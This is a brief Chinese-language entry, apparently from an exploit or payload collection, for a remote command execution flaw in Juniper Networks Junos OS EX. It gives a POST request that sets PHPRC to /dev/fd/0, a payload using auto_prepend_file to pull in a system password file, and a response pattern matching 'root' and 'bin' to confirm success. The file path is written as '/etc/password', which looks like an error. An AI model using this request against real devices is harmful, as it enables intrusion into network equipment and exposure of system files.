# JuniperNetworksJunosOSEX远程命令执行漏洞

JuniperNetworksJunosOSEX ｜ 命令执行 ｜ —
- **请求**：`POST /?PHPRC=/dev/fd/0 HTTP/1.1`

**Payload**
```
auto_prepend_file="/etc/password"
```
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$